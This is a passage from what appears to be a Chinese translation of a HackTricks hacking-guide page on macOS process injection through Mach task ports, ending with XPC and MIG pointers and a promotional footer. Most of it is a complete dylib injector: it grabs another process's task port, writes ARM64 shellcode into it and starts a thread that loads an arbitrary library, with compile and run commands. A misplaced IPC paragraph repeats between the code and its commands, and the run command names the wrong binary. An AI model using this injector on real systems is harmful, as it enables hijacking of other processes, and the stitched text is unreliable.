printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

### macOS进程滥用

#### macOS IPC（进程间通信）

在macOS系统中，进程间通信（IPC）是一种允许不同进程之间相互交换数据的机制。这种通信方式可以被恶意用户或恶意软件利用来实现特权升级或执行其他攻击。
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### 通过任务端口在线程中进行 Dylib 注入

在 macOS 中，**线程** 可能通过 **Mach** 或使用 **posix `pthread` api** 进行操作。我们在前面的注入中生成的线程是使用 Mach api 生成的，因此**不符合 posix 标准**。

可以**注入一个简单的 shellcode**来执行命令，因为它**不需要使用 posix** 兼容的 api，只需要使用 Mach。**更复杂的注入**需要**线程**也符合 **posix 标准**。

因此，为了**改进线程**，应该调用 **`pthread_create_from_mach_thread`**，这将**创建一个有效的 pthread**。然后，这个新的 pthread 可以**调用 dlopen** 从系统中**加载一个 dylib**，因此，不需要编写新的 shellcode 来执行不同的操作，而是可以加载自定义库。

您可以在这里找到**示例 dylibs**（例如生成日志然后您可以监听它的示例）：

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"无法为远程线程的代码设置内存权限：错误 %s\n", mach_error_string(kr));
return (-4);
}

// 设置分配的堆栈内存的权限
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"无法为远程线程的堆栈设置内存权限：错误 %s\n", mach_error_string(kr));
return (-4);
}


// 创建线程以运行shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // 这是真正的堆栈
//remoteStack64 -= 8;  // 需要16字节对齐

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("远程堆栈 64  0x%llx, 远程代码是 %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"无法创建远程线程：错误 %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "用法: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: 磁盘上dylib的路径\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"未找到Dylib\n");
}

}
```
</details>  
### macOS进程滥用  
#### macOS IPC（进程间通信）  
在macOS系统中，进程间通信（IPC）是一种允许不同进程之间相互交换数据的机制。攻击者可以利用IPC来实现特权升级或执行其他恶意操作。在macOS中，常见的IPC机制包括XPC和Mach RPC。攻击者可能利用这些机制来绕过安全控制并执行恶意代码。要防止这种滥用，可以实施严格的权限控制和监控机制。
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 通过任务端口进行线程劫持 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在这种技术中，进程的一个线程被劫持：

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本信息

XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种机制，用于在系统上不同进程之间进行安全的异步方法调用。这是Apple安全范式的一部分，允许创建特权分离的应用程序，其中每个组件仅以执行其工作所需的权限运行，从而限制来自受损进程的潜在损害。

有关此通信工作方式及其可能存在漏洞的更多信息，请查看：

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach接口生成器

MIG被创建用于简化Mach IPC代码创建的过程。它基本上为服务器和客户端生成所需的通信代码。即使生成的代码很丑陋，开发人员只需导入它，他的代码将比以前简单得多。

有关更多信息，请查看：

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 参考资料

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
